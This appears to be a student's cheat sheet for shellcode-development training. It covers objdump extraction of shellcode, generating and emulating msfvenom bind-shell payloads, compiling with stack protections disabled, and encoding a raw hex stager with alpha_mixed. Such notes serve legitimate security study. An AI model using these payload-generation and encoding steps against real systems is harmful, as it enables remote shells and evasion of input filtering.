
there is no .decode('hex') on Python 3. .decode('hex') uses binascii.unhexlify() on Python 2
>import binascii

>print (binascii.unhexlify(a))

when running with nasm, u are less likely to have weird register states... in the middle of a c program, ebx is gonna be anything.. from _start
check for nulls and bad chars: objdump -d ./execve-stack -M intel

extract shellcode from binary:
> objdump -d ./execve-stack|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

^^^Pay attention to the number of opcodes printed from null check and adjust the mah=gic string accordingly at "cut -f1-6 -d' '"

Disassemble shellcode: echo -ne "<shellcode>" | ndisasm -u -

Disassemble msfvenom payload: msfvenom -p linux/x86/shell_bind_tcp | ndisasm -u -

Analyse msfvenom shellcode: msfvenom -p linux/x86/shell_bind_tcp --format raw | sctest -vvv -Ss 5000 (verbose and read form STDIN)

Dump msfvenom payload as hex: msfvenom -p linux/x86/chmod FILE=/test.txt R | hexdump -v -e '"\\x" 1/1 "%02x"'

OUtput to a viual file, first: msfvenom -p linux/x86/shell_bind_tcp --format raw | sctest -vvv -Ss 5000 -G shell_bind_tcp.dot
Then: dot shell_bind_tcp.dot -T png -o shell_bind_tcp.png

compile shellcode: 
>gcc shellcode.c -fno-stack-protector -z execstack -o shellcode

get syscall value: 
>cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep access


view location of a variable: 
>print /x <variable> 
OR simply info variables and get them all
examine bytes starting at an address: 
>x/45xb <address>
>break <*&break +X> (* is for break & is address)
OR simply *0x<address>
View contents of variable: 
>x/s <memaddress>


Getting libemu to work when it doesn't:
>git clone https://github.com/buffer/libemu.git
>apt-get install autoconf
>apt-get install libtool
>aclocal -I /usr/share/libtool
>autoheader
>autoreconf -v -i
>./configure --prefix=/opt/libemu; make install
in /bin:
>ln -s /opt/libemu/bin/sctest 

 NOT SLAE but relevant:
 to encode problematic shellcode stager(OSCE):
 
perl -e 'print "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x74\xF0\x89\xD7\xAF\x75\xF0\xAF\x75\xED\xB8\x90\x50\x90\x50\xFF\xE7"' > exploit.bin
cat exploit.bin | /usr/bin/msfvenom -p - -a x86 --platform windows -e x86/alpha_mixed -f python
